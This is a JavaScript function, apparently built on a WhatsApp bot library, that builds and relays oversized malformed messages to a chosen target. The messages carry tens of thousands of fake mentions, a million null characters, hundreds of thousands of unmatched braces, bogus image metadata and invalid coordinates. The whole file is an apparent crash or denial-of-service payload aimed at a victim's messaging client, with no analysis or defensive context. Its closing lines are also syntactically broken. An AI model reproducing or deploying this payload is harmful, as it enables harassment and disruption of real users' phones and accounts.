async function VortunixSql(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            body: {
              text: "⃟Kenal Gyzen Ga? ?༑",
            },
            contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"], 
            isForwarded: true,
            forwardingScore: 9999,
            businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                 }),
               },
               {
                 name: "mpm",
                 buttonParamsJson: "",
               },
               ], 
                 messageParamsJson: "{{".repeat(10000),
                },
              },
            },
          },
        },
      };
      
    const mentions = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

const mentions2 = [
        target,
        "0@s.whatsapp.net",
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 5_000_000)}@s.whatsapp.net`)
    ];

    const payload1 = "\u0000".repeat(1_000_000);
    const msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "bruh ga guna dh" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: payload1,
                        version: 3
                    }
                },
                contextInfo: { mentionedJid: mentions }
            }
        }
    }, {});
    await sock.relayMessage("status@broadcast", msg1.message, { messageId: msg1.key.id, statusJidList: [target] });
    
    const payload = {
      viewOnceMessage: {
        message: {
          imageMessage: fakeImage,
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "gtw" },
            footer: { text: "⏤⃟༑Vortunix?Anti Ampas" },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              mentionedJid: mentions,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", payload, {
      messageId: null,
      statusJidList: [target]
    )};
  }
}